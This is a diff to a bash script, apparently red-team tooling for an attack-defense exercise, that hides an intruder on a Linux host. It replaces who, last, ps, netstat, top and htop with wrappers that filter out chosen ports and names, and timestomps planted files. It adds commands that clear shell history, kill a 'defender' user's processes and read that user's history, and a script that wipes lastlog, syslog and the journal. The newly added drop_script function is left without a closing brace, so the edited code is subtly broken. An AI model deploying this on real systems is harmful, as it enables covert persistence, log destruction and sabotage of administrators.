@@ -2,6 +2,13 @@
 bins=("who" "last" "top" "netstat" "ps" "htop")
 replacewith=("what" "long" "pot" "nest" "elf" "hpot")
 exclude="mail|uucp|ssh_client|capbarb|grep|what|elf|9999|2323|1919|1212"
+TIMESTAMP_REF="/usr/bin/xargs"
+
+drop_script() {
+    local path="$1"
+    echo "$2" > "$path"
+    chmod +x "$path"
+    touch -r "$TIMESTAMP_REF" "$path"
 
 for i in "${!bins[@]}"; do
     cmd="${bins[$i]}"
@@ -13,7 +20,7 @@ for i in "${!bins[@]}"; do
         mv "$orig_path" "$real_bin"
 
         echo "#!/usr/bin/env bash
-$real_bin \"\$@\" | egrep -v '$exclude'" > "$orig_path"
+$real_bin \"\$@\" | grep -Ev '$exclude'" > "$orig_path"
         chmod +x "$orig_path"
         touch -r "$real_bin" "$orig_path"
         echo "[+] $cmd -> $swap"
@@ -43,9 +50,9 @@ md5sum /bin/bash
 md5sum /usr/sbin/nologin
 md5sum /usr/bin/false
 
-printf "unset HISTFILE\nhistory -c\n" > /usr/bin/ww && chmod +x /usr/bin/ww && touch -r /usr/bin/xargs /usr/bin/ww
-echo "pkill -u defender" > /usr/bin/mm && chmod +x /usr/bin/mm && touch -r /usr/bin/xargs /usr/bin/mm
-echo "cat /home/defender/.bash_history" > /usr/bin/look && chmod +x /usr/bin/look && touch -r /usr/bin/xargs /usr/bin/look
+drop_script /usr/bin/ww   "$(printf 'unset HISTFILE\nhistory -c')"
+drop_script /usr/bin/mm   "pkill -u defender"
+drop_script /usr/bin/look "cat /home/defender/.bash_history"
 
 cat << 'EOF' > /usr/bin/logre
 #!/usr/bin/env bash
@@ -56,4 +63,4 @@ truncate -s 0 /var/log/lastlog
 truncate -s 0 /var/log/syslog
 sudo journalctl --vacuum-time=1s
 EOF
-chmod +x /usr/bin/logre && touch -r /usr/bin/xargs /usr/bin/logre
+chmod +x /usr/bin/logre && touch -r "$TIMESTAMP_REF" /usr/bin/logre
